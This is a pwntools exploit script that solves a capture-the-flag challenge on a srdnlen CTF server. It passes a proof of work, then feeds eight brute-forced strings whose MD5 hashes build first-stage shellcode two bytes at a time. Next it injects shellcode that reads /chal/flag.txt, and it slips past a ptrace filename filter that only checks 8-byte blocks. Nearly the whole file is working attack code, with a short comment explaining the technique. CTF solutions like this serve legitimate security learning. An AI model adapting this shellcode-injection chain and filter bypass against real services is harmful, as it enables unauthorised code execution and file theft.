from pwn import *
import time
context.arch = 'amd64'
context.log_level = 'debug'
p = remote('buoncammino.challs.srdnlen.it', 443, ssl = True)
# Solve pow
p.recvuntil('or\n')
cmd = p.recvline().replace(b'"', b'')
print(cmd)
io = process(cmd.split())
out = io.recvline().replace(b'hashcash stamp: ', b'').replace(b'\n', b'')
print(out)
p.sendlineafter("Result:", out)

def ooo(s):
    p.sendlineafter(">", "1")
    p.sendlineafter(":", s)
'''
Basically this challenge is you give it a string and it calculates the md5 of that string.
Then it strncat the md5 bytes to a shellcode buffer. Which will stop when it finds a NULL byte.
So if we want shellcode instruction like "31 ff" which is "xor edi,edi"
We want to find string which md5 is 31ff00...
Since we only have 9 tries so we calculate 2 bytes of instruction each time.
The probability of finding desired 2 instruction hash is 1/256**3, it's fast enough to brute force.
1 byte each time is too short for the first stage shellcode, 3 bytes probability is just too low.
See hasher.py for more details.
Also the ptrace detecting the open filename has "flag" is broken, it only checks 8 bytes as a block
So we can just make the filename longer to cross the "block". Credit @ItayB
'''
ooo(b'GN"\x17\x1b\x1e\xe2\xb4')
ooo(b'\xe9\x8f\x1e\xbb[\r\x17\x9a')
ooo(b'\xf0j|}\r\x88\xd9m')
ooo(b'\x06\xe6\x0fA\xd1\xae\x02\xde')
ooo(b'\xe6z\xb8\xc2\x1c\x03p\x8f')
ooo(b'\xf1\xef\x94\xd7\x8aP\xf2\xa7')
ooo(b'"\xa9\xa4&\x1e\xd2\xfbX')
ooo(b'\x97\x02\x93\xd4\xb00X\x84')

p.sendlineafter(">", "2")

time.sleep(1)
shellcode = shellcraft.linux.openat(-1, "/chal/flag.txt")
shellcode += shellcraft.linux.read('rax', 'rsp', 80)
shellcode += shellcraft.linux.write(1, 'rsp', 80)

p.sendline(b'\x90' * 0x20 + asm(shellcode))
p.interactive()